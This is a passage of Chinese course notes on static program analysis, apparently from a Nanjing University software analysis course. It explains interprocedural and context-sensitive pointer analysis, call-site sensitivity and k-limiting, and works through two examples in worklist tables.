<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210409144614271.png" alt="image-20210409144614271" style="zoom:80%;">

<p>指定对象的x只流向对应的对象，是无法跨对象传递的。</p>
<p>连上这条this边，就会有很多错误的边。</p>
<p>参数没法决定receiver object是哪个 所以随便连 没关系的</p>
<h3 id="过程间PTA算法"><a href="#过程间PTA算法" class="headerlink" title="过程间PTA算法"></a>过程间PTA算法</h3><p><strong>问题</strong>：由于<strong>指针分析和CG调用图的构造互相依赖</strong>，所以每次迭代只分析可达的函数和语句。然后不断发现和分析新的可达函数。</p>
<p><strong>方法</strong>：“一起做”。从main入口开始做，开始建边，分析可达性方法，不断挖掘。</p>
<p><strong>可达示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824220851231.png" alt="image-20200824220851231"></p>
<p><strong>算法</strong>：</p>
<p>上下文不敏感 每个方法只统计一次</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824221040655.png" alt="image-20200824221040655"></p>
<p><strong>符号</strong>：</p>
<ul>
<li>m_entry：入口main函数</li>
<li>Sm：函数m中的语句</li>
<li>S：可达语句的集合（就是RM中的语句）</li>
<li>RM：可达函数的集合</li>
<li>CG：调用图的边</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824221625840.png" alt="image-20200824221625840"></p>
<p>理解：</p>
<ol>
<li><p>AddReachable就是拓展世界的函数，只有两处会调用：</p>
<ol>
<li>程序入口点；</li>
<li>新的调用边被发现；</li>
</ol>
<p>在新方法加入之后，先<strong>只看new和assign赋值语句</strong>，因为load和store是随着改变而改变，先研究也没有意义。</p>
</li>
<li><p>ProcessCall里面，x表示的是一个变量，是receiver object，oi表示的是流向x的某个新来的对象。</p>
<p>首先遍历与x有关的调用语句，先调用dispatch，取出真正的目标方法m</p>
<p>接下来将&lt;this,oi&gt;加入到worklist中，也就是将receiver object传递给this变量</p>
<p>l就是call site，m就是解出来的目标方法</p>
<p>如果l-m这条边在CG中没有的话，添加一条边</p>
<p>AddReachable拓展m方法</p>
<p>传递形参</p>
<p>传递返回值</p>
</li>
<li><p><strong>问题</strong>：为什么ProcessCall(x, oi)中，要判断<code>L-&gt;m</code>这条边是否已经加入到CG？因为x可能指向多个对象，就会多次处理L这个调用指令，可能x中别的对象oj早就已经将这条边加入进去了。</p>
</li>
</ol>
<h3 id="例子-4"><a href="#例子-4" class="headerlink" title="例子"></a>例子</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824225530096.png" alt="image-20200824225530096"></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">WL</th>
<th align="center">正处理</th>
<th align="center">PFG</th>
<th align="center">指针集</th>
<th align="center">RM</th>
<th align="center">CG</th>
<th align="center">语句</th>
<th>算法语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">[]</td>
<td align="center"></td>
<td align="center">{}</td>
<td align="center"></td>
<td align="center">{}</td>
<td align="center">{}</td>
<td align="center"></td>
<td>初始化</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">[]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">{A.main()}</td>
<td align="center"></td>
<td align="center">1，2</td>
<td>AddReachable(mentry)</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">[&lt;a,{o3}&gt;, &lt;b,{o4}&gt;]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">3，4</td>
<td></td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">[&lt;b,{o4}&gt;]</td>
<td align="center">&lt;a,{o3}&gt;</td>
<td align="center"></td>
<td align="center">pt(a)={o3}；</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">[]</td>
<td align="center">&lt;b,{o4}&gt;</td>
<td align="center"></td>
<td align="center">pt(b)={o4}</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">[]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">5</td>
<td>ProcessCall(b, o4)</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">[&lt;B.foo/this, {o4}&gt;]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">{5-&gt;B.foo(A)}</td>
<td align="center"></td>
<td>m=Dispatch(o4, foo())=B.foo()；添加到调用图</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">[&lt;B.foo/this, {o4}&gt;, &lt;r, o11&gt;]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">{A.main(), B.foo()}</td>
<td align="center"></td>
<td align="center"></td>
<td>AddReachable(B.foo())；添加到可达函数</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">[&lt;B.foo/this, {o4}&gt;, &lt;r, o11&gt;, &lt;y, {o3}&gt;]</td>
<td align="center"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824231337322.png" alt="image-20200824231337322"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td>AddEdge()；添加参数边、返回值边</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">[&lt;r, o11&gt;, &lt;y, {o3}&gt;]</td>
<td align="center">&lt;B.foo/this, {o4}&gt;</td>
<td align="center"></td>
<td align="center">pt(B.foo/this)={o4}；</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td>while开头，B.foo/this没有调用任何函数</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">[&lt;y, {o3}&gt;, &lt;c, {o11}&gt;]</td>
<td align="center">&lt;r, o11&gt;</td>
<td align="center"></td>
<td align="center">pt(r)={o11}；</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center"></td>
<td align="center">&lt;y, {o3}&gt;, &lt;c, {o11}&gt;</td>
<td align="center"></td>
<td align="center">pt(y)={o3}；pt(c)={o11}</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td>while开头</td>
</tr>
</tbody></table>
<p>如果是CHA的话，CG={5-&gt;B.foo(A), <strong>5-&gt;A.foo(A)</strong>}，错误识别为调用边。</p>
<p><strong>结果</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824231630468.png" alt="image-20200824231630468"></p>
<p><strong>问题</strong>：没有入口函数的？如对库函数处理，生成调用库函数的程序。</p>
<p>理解rule 4条： dispatch解目标方法，传this，传参数，传返回值</p>
<h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><h2 id="上下文不敏感分析"><a href="#上下文不敏感分析" class="headerlink" title="上下文不敏感分析"></a>上下文不敏感分析</h2><p><strong>说明</strong>：上下文敏感分析是对指针分析的准确性提升最有效的技术。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825134216437.png" alt="image-20200825134216437"></p>
<p><strong>问题</strong>：上下文不敏感时，分析常量传播这个问题，由于没有明确调用id()的上下文，会把不同的调用混合在一起，对id函数内的变量n只有一种表示（<strong>没有对局部变量进行区分</strong>），导致n指向的对象集合增大，将i识别为非常量NAC。实际上，x.get()的值只来自于One()对象，i应该是常量1。</p>
<p><strong>解决</strong>：根据调用的上下文（主要有3种：如根据调用点所在的行数——call-site sensitivity）来区分局部变量。</p>
<h2 id="上下文敏感分析"><a href="#上下文敏感分析" class="headerlink" title="上下文敏感分析"></a>上下文敏感分析</h2><p><strong>概念</strong>：</p>
<ul>
<li>call-site sensitivity (call-string)：根据<strong>调用点位置</strong>的不同来区分上下文，<code>3：id(n1)</code> / <code>4：id(n2)</code>。</li>
<li>Cloning-Based Context Sensitivity：每种上下文对应一个节点，标记调用者的<strong>行数</strong>。克隆多少数据，后面会讨论。</li>
<li>Context-Sensitive Heap：面向对象程序（如Java）会频繁修改堆对象，称为heap-insensitive。所以不仅要给变量加上下文，也要给堆抽象加上下文，称为heap context（本课程是基于allocate-site来进行堆抽象的）。</li>
</ul>
<p>Context Insensitivity 上下文不敏感的原因：</p>
<ul>
<li><strong>在动态执行的过程中，一个方法可能在不同的上下文条件下被调用多次</strong>。</li>
<li>在不同的上下文过程中，方法的参数返回值也会指向不同的对象。</li>
<li>在上下文不敏感的分析中，不同上下文调用的参数会被<strong>混合</strong>，然后会将错误结果传播继续往下传播，造成不准确</li>
<li></li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825135441351.png" alt="image-20200825135441351"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825141714234.png" alt="image-20200825141714234"></p>
<p>会得到粒度更细的堆抽象</p>
<p><strong>堆抽象上下文示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825164309086.png" alt="image-20200825164309086"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210412114030719.png" alt="image-20210412114030719"></p>
<p><strong>堆抽象上下文不敏感</strong>：如果不区分<code>8 ：X x = new X();</code>调用的堆抽象的上下文，导致只有1个o8.f，把两个上下文调用产生的o8.f指向集合都合并了，得出了o8.f的错误指向的结果。</p>
<p><strong>堆抽象上下文敏感</strong>：用不同的调用者来区分堆抽象，如<code>3:o8</code>、<code>4:o8</code>是不同上下文创建的堆抽象。所以说，既要根据上下文的不同来区分局部变量，也要区分堆抽象，<strong>例如：<code>3:p</code>是给变量加上下文，<code>3:o8</code>是给堆抽象加上下文</strong>。</p>
<p><strong>规则</strong>：<strong>变量上下文标号和堆上下文标号都是缺一不可的</strong>。谁敏感谁加行号区分，行号其实就是上下文环境。</p>
<h2 id="上下文敏感指针分析：规则"><a href="#上下文敏感指针分析：规则" class="headerlink" title="上下文敏感指针分析：规则"></a>上下文敏感指针分析：规则</h2><p>指针两种：变量 &amp; field</p>
<p><strong>标记</strong>：根据调用者的行数来区分不同上下文，只要区分了函数、变量、堆对象，就能够区分实例域、上下文敏感的指针（变量+对象域）。C—上下文（暂时用调用点的行数表示），O—对象，F—对象中的域。</p>
<p>方法、变量、对象都需要上下文前缀</p>
<p>field不存在上下文，但是实例对象的object的fields是有上下文前缀的</p>
<p>指针(上下文敏感指针的)指向的对象是有上下文前缀的</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825165457684.png" alt="image-20200825165457684"></p>
<p><strong>基本规则</strong>：跟之前区别不大，只是增加了个上下文标记，有细微区别。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825170905512.png" alt="image-20200825170905512"></p>
<p>很经典的一张图，值得细细品味。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825170932518.png" alt="image-20200825170932518"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825173755842.png" alt="image-20200825173755842"></p>
<p><strong>解读</strong>：</p>
<ol>
<li>首先<code>l: r = x.k(a1,...,an)</code>意思是在c上下文中，x所指向oi的对象，oi它的上下文为c’</li>
<li>第二步，解析目标方法，依然是dispatch</li>
<li>多了一步，<strong>select 选择方法的上下文</strong>，对于目标函数m选择上下文，根据调用点的信息，获得不同上下文条件下的目标方法ct</li>
<li>传this：传的是ct上下文条件下m方法的this变量</li>
<li>传参数：也是在特定上下文方法下的参数，会区分开数据流</li>
<li>传返回值：从哪来，回哪里去。（不敏感就是到处瞎走，敏感就是自己知道该回哪去）</li>
</ol>
<h2 id="Context-Sensitive-Pointer-Analysis：Algorithms"><a href="#Context-Sensitive-Pointer-Analysis：Algorithms" class="headerlink" title="Context Sensitive Pointer Analysis：Algorithms"></a>Context Sensitive Pointer Analysis：Algorithms</h2><p><strong>区别</strong>：和过程间指针分析相比，仍然分为两个过程，分别是构造PFG和根据PFG传递指向信息。主要区别是添加了上下文。</p>
<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210412144246826.png" alt="image-20210412144246826" style="zoom:67%;">

<p><strong>PFG构造</strong>：边添加规则和之前一样，Assign、Store、Load、Call，Call需要加参数传递、返回值传递的边。</p>
<p>节点为上下文敏感的指针，每个节点都带有上下文的信息；</p>
<p>边：节点之间的关系，指针集的流向关系。</p>
<p>其实就是每个关键的上下文都需要记录下来</p>
<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210412150447980.png" alt="image-20210412150447980" style="zoom:50%;">

<p><strong>符号</strong>：</p>
<ul>
<li>S：可达语句的集合（就是RM中的语句）</li>
<li>Sm：函数m中的语句</li>
<li>RM：可达函数的集合，带有上下文信息</li>
<li>CG：调用图的边，带有上下文信息</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825211520919.png" alt="image-20200825211520919"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825212747860.png" alt="image-20200825212747860"></p>
<h2 id="Context-Sensitivity-Variants-上下文Select函数选取规则"><a href="#Context-Sensitivity-Variants-上下文Select函数选取规则" class="headerlink" title="Context Sensitivity Variants 上下文Select函数选取规则"></a>Context Sensitivity Variants 上下文Select函数选取规则</h2><p><strong>上下文的选取主要采用3类</strong>：</p>
<ul>
<li>Call-Site Sensitivity </li>
<li>Object Sensitivity</li>
<li>Type Sensitivity</li>
<li>…</li>
</ul>
<p><strong>说明</strong>：Select(c,l,c’:o<sub>i</sub>,m)，c—调用者上下文，l—调用者语句，c’:o<sub>i</sub>—接收对象（含堆的上下文信息）,m目标方法。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825214950322.png" alt="image-20200825214950322"></p>
<h3 id="Call-site-Sensitivity"><a href="#Call-site-Sensitivity" class="headerlink" title="Call-site Sensitivity"></a>Call-site Sensitivity</h3><p><strong>原理</strong>：又称为k-call-site sensitivity / k-CFA，不断添加调用行号。</p>
<blockquote>
<p>Select(<strong>c,l</strong>,c’:oi,m) = (l’,…,l’’, l)</p>
</blockquote>
<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210412163639405.png" alt="image-20210412163639405" style="zoom:50%;">

<p>维护一个抽象调用栈。</p>
<p><strong>问题</strong>：如果函数调用自身，导致无限递归，如何限制上下文长度？</p>
<p><strong>解决</strong>：k-limiting Context Abstraction。对上下文加以限制，只取最后k个上下文，通常取k&lt;=3。</p>
<p>例如，函数方法的上下文通常取2，堆上下文通常取1。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825220600403.png" alt="image-20200825220600403"></p>
<p><strong>示例</strong>：采用1-Call-Site，省略heap上下文。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825223106171.png" alt="image-20200825223106171"></p>
<p>步骤：</p>
<p>初始化全部为空，接下来AddrReachable处理入口方法，上下文为空[]。首先入口方法为main方法，进到AddReachable之后，RM可达方法集合为<code>{[]:C.main()}</code>，WL中添加<code>[&lt;[]:c,{o3}&gt;]</code>注意是带有上下文的。接下来处理WL中的项，先做差集，o3加到带有上下文的指针集。这里没有load和store，走到processcall。进到processcall之后，select结果ct是4，代表是第四行进行了调用。接下来传递receiverobject，也就是<code>[&lt;[4]:C.mthis,{o3}&gt;]</code>放到WL中，表示将o3传递给4环境下的C类的this对象，接下来构建CG，也就是<code>{[]:4-&gt;[4]:C.m()}</code>表示在上下文为起始方法时，在第四行调用了C类的m方法，并且调用时候的上下文是4也就是在第四行调用的。接下来AddReachable，这时候RM可达方法集合为<code>{[]:C.main(),[4].C.m()}</code>，处理new语句，WL现状：<code>[&lt;[4]:C.mthis,{o3}&gt;,&lt;[4]:n1,{o12}&gt;,&lt;[4]:n2,{o13}&gt;]</code>表示在上下文为4的背景下，new出来了两个对象，分别在第12行和第13行创建。然后传参传返回值都是空，所以结束。</p>
<p>接下来处理WL中的下一个，应该是<code>&lt;[4]:C.mthis,{o3}&gt;</code>，首先propagate，算差集，this之前指针集还是空，那么o3就放到<code>[4]:C.mthis</code>的指针集里面。往下走，没有load和store，但是有两个方法调用，那么进入processcall，dispatch求得目标函数为<code>m=C.id(Number)</code>，上下文ct为[14]，往下走，先处理14行的上下文：构建CG调用边，CG目前现状：<code>{[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number)}</code>，AddReachable将RM更新为<code>{[]:C.main(),[4].C.m(),[14]:C.id(Number)}</code>表示新添加的方法可达，接下来传参，<code>[4]:n1-&gt;[14]:n</code>表示n1参数作为实参传递给14行的形参；传返回值也类似：<code>[14]:n-&gt;[4]:x</code>表示14行的n作为返回值，传递给了4上下文下的x。接下来处理15行的上下文，m还是<code>m=C.id(Number)</code>，上下文ct为[15]，CG为：<code>{[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)}</code>，RM为<code>{[]:C.main(),[4].C.m(),[14]:C.id(Number),[15]:C.id(Number)}</code> ，接下来传参，<code>[4]:n2-&gt;[15]:n</code> ，传返回值<code>[15]:n-&gt;[4]:y</code> 这也就是通过上下文将数据流分开。</p>
<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210413110026476.png" alt="image-20210413110026476" style="zoom:50%;">

<p>接下来继续处理WL里面剩余的参数，该轮到<code>&lt;[4]:n1,{o12}&gt;</code>和<code>&lt;[4]:n2,{o13}&gt;</code>了 这里同理快进，其实就是把o12和o13接到了PFG上面，开始传播</p>
<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210413110628280.png" alt="image-20210413110628280" style="zoom:50%;">

<p>当o12传递给x之后，执行<code>x.get()</code>方法调用</p>
<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210413110820741.png" alt="image-20210413110820741" style="zoom:50%;">

<p>最终结果：</p>
<p>&lt;img src=”../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210413110839543.png” alt=”image-20210413110839543” style=”zoom:50%;” /</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">WL</th>
<th align="center">正处理</th>
<th align="center">PFG</th>
<th align="center">指针集</th>
<th align="center">RM</th>
<th align="center">CG</th>
<th align="center">处理语句</th>
<th align="center">算法语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">{[]:C.main()}</td>
<td align="center"></td>
<td align="center">3</td>
<td align="center">AddReachable(mentry)—加入RM</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">[&lt;[]:c, {o3}&gt;]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">3</td>
<td align="center">AddReachable(mentry)—处理New</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">[]</td>
<td align="center">&lt;[]:c, {o3}&gt;</td>
<td align="center"></td>
<td align="center">pt([]:c) ={o3}；</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">While开头，Propagate()—遍历WL更新指针</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">[⟨[4]:C.mthis, {o3}⟩]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">4</td>
<td align="center">ProcessCall()—this指针加入WL</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">[⟨[4]:C.mthis, {o3}⟩]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">{[ ]:4 → [4]:C.m()}；</td>
<td align="center"></td>
<td align="center">ProcessCall()——函数加入CG</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">[⟨[4]:C.mthis, {o3}⟩，⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"></td>
<td align="center">没有参数/返回值</td>
<td align="center"></td>
<td align="center">{[]:C.main(), [4]:C.m()}</td>
<td align="center"></td>
<td align="center">12,13</td>
<td align="center">ProcessCall():AddReachable(m)处理m函数中的New</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center">⟨[4]:C.mthis, {o3}⟩</td>
<td align="center"></td>
<td align="center">pt([]:c) ={o3}；pt([4]:C.mthis)={o3}；</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">While开头，Propagate()—遍历WL更新指针</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">ProcessCall():处理m中的this调用</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">14</td>
<td align="center">ProcessCall():Select(c,l,c’:oi)选择上下文ct=[14]</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">{[]:C.main()， [4]:C.m()，[14]:C.id(Number)}</td>
<td align="center">{[ ]:4 → [4]:C.m()；[4]:14 → [14]:C.id(Number)}；</td>
<td align="center"></td>
<td align="center">ProcessCall():AddReachable([14]:C.id(Number))</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"></td>
<td align="center">[4]:n1→[14]:n→[4]:x；</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">ProcessCall():AddEdge()参数边/返回值边</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"></td>
<td align="center">[4]:n1→[14]:n→[4]:x；[4]:n2→[15]:n→[4]:y；</td>
<td align="center"></td>
<td align="center">{[]:C.main()， [4]:C.m()，[14]:C.id(Number)，[15]:C.id(Number)}</td>
<td align="center">{[ ]:4 → [4]:C.m()；[4]:14 → [14]:C.id(Number)，[4]:15 → [15]:C.id(Number)}；</td>
<td align="center">15</td>
<td align="center">ProcessCall()同理</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">[]</td>
<td align="center">[⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩]</td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825230454779.png" alt="image-20200825230454779"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">While开头—遍历WL更新指针</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">[]</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825230511116.png" alt="image-20200825230511116"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825230522461.png" alt="image-20200825230522461"></td>
<td align="center">16</td>
<td align="center">While开头，ProcessCall()—处理<code>x.get()</code></td>
</tr>
</tbody></table>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825230355976.png" alt="image-20200825230355976"></p>
